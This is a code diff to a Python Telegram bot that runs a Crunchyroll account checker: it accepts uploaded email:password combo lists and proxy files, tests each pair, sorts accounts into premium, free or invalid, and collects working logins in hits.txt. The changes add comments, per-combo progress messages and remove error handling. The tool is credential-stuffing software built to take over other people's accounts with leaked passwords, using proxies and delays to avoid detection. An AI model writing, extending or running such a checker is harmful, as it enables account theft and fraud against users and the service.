@@ -231,6 +231,7 @@ async def set_delay(message: types.Message):
 async def handle(message: types.Message):
     global checker
 
+    # Proxy loading
     if message.text and message.text.startswith("/proxies"):
         if message.document:
             file = await bot.get_file(message.document.file_id)
@@ -243,12 +244,14 @@ async def handle(message: types.Message):
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
+    # Combo checking
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
     else:
         content = message.text
 
+    # STRICT CLEANING - ONLY email:password
     lines = []
     for raw in content.splitlines():
         raw = raw.strip()
@@ -264,29 +267,28 @@ async def handle(message: types.Message):
     if not lines:
         return await message.answer("No valid email:password found.")
 
+    # Reset checker for every new file
     checker = CrunchyrollChecker(proxies)
 
     await message.answer(f"🚀 Checking {len(lines)} combos... (delay: {RATE_DELAY}s)")
 
-    for line in lines:
-        try:
-            email, password = line.split(":", 1)
-            result = checker.check(email.strip(), password.strip())
+    for i, line in enumerate(lines, 1):
+        email, password = line.split(":", 1)
+        await message.answer(f"[{i}/{len(lines)}] Checking → {email}")   # ← Added checking process
 
-            stats['checked'] += 1
-            if result['status'] == 'PREMIUM':
-                stats['premium'] += 1
-            elif result['status'] == 'FREE':
-                stats['free'] += 1
-            else:
-                stats['invalid'] += 1
+        result = checker.check(email.strip(), password.strip())
 
-            await send_result(message.from_user.id, result)
+        stats['checked'] += 1
+        if result['status'] == 'PREMIUM':
+            stats['premium'] += 1
+        elif result['status'] == 'FREE':
+            stats['free'] += 1
+        else:
+            stats['invalid'] += 1
 
-            await asyncio.sleep(RATE_DELAY)
+        await send_result(message.from_user.id, result)
 
-        except:
-            continue
+        await asyncio.sleep(RATE_DELAY)
 
     # Send hits.txt file at the end
     if os.path.exists("hits.txt") and os.path.getsize("hits.txt") > 0:
